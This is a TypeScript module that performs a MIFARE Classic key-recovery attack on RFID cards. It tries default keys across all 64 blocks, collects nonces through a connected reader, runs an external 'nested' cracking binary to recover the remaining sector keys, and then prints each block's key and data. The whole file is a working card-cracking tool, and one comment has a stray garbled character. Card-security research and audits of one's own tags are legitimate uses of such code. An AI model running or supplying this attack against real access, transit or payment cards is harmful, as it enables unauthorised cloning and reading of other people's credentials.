import chalk from 'chalk'
import { spawnSync } from 'child_process'

import Device, { KeyType } from './Device.mjs'

const STANDARD_KEYS = ['FFFFFFFFFFFF', 'A0A1A2A3A4A5', 'D3F7D3F7D3F7', '000000000000']

const runNested = (args: string[]): Set<string> => {
  const stdout = spawnSync('./bin/nested', args, { encoding: 'utf-8' }).stdout
  const keys = stdout
    .trim()
    .split('\n')
    .flatMap(line => {
      const trimmed = line.trim()
      const match = trimmed.match(/Key [0-9]\.\.\. ([a-f0-9]{12})/)
      if (match === null) return []
      return [match[1]]
    })
  return new Set(keys)
}

const hardnestedAttack = async (providedKeys: string[], keyType = KeyType.A, customPasses?: number) => {
  const passes = Math.max(2, customPasses ?? 0)
  console.error(chalk.gray(`Running hardnested attack with ${passes} pass(es)`))
  console.error(chalk.gray(`Using key type ${KeyType[keyType]}`))
  console.error('\n')

  const keys = new Set([...STANDARD_KEYS, ...providedKeys].map(key => key.toLowerCase()))
  const blocks = Array(64).fill(null) as Array<null | { key: Buffer; data: Buffer }>
  const device = await Device.connect()

  await device.scanTag14A()

  const testKeys = async (block: number, keysToTest = keys): Promise<string | null> => {
    // Print to stderr so that it doesn't get piped to stdout
    console.error(chalk.gray(`Testing keys for block ${block}`))

    for (const keyString of keysToTest) {
      const key = Buffer.from(keyString, 'hex')
      const response = await device.readMifareBlock(block, keyType, key).catch(() => null)
      if (response === null) continue
      blocks[block] = { key, data: response }
      return key.toString('hex')
    }

    return null
  }

  for (let i = 0; i < 64; i++) await testKeys(i)

  const knownBlockIndex = blocks.findIndex(block => block !== null)
  const knownBlock = blocks[knownBlockIndex]
  if (!knownBlock) throw new Error('No known block found')

  // Print to stderr so that it doesn't get piped to stdout
  console.error(chalk.gray(`Known block: ${knownBlockIndex} (${knownBlock.key.toString('hex')})`))

  const attackBlock = async (i: number): Promise<void> => {
    // Skip known blocks
    if (blocks[i] !== null) return

    // Test keys that h§ave been found so far
    await testKeys(i)
    // If a key has now been found, skip to next block
    if (blocks[i] !== null) return

    // Run nested attack
    const { uid, distance } = await device.detectNtDistance(knownBlockIndex, keyType, knownBlock.key)
    const groups = await device.acquireNestedGroups(knownBlockIndex, keyType, knownBlock.key, i, keyType)
    const args = [uid, distance, ...groups.flatMap(group => [group.nt, group.ntEnc, group.par])].map(String)
    const foundKeys = runNested(args)
    // Print to stderr so that it doesn't get piped to stdout
    console.error(chalk.gray(`Ran nested attack on block ${i}: found ${foundKeys.size} key(s)`))

    // Test keys that have been found
    const workingKey = await testKeys(i, foundKeys)

    // Add the working key to the list of known keys
    if (workingKey !== null) keys.add(workingKey)
  }

  // Run attack multiple times, as some keys may only be found once earlier keys have been found
  for (let pass = 0; pass < passes; pass++) {
    for (let i = 0; i < 64; i++) await attackBlock(i)
  }

  for (let i = 0; i < 64; i++) {
    const block = blocks[i]
    if (block === null) {
      console.log(chalk.redBright(`${i.toString().padStart(2, '0')}:`), 'No key found')
    } else {
      const { key, data } = block
      console.log(chalk.greenBright(`${i.toString().padStart(2, '0')}:`), key.toString('hex'), data.toString('hex'))
    }
  }

  await device.close()
}

export default hardnestedAttack
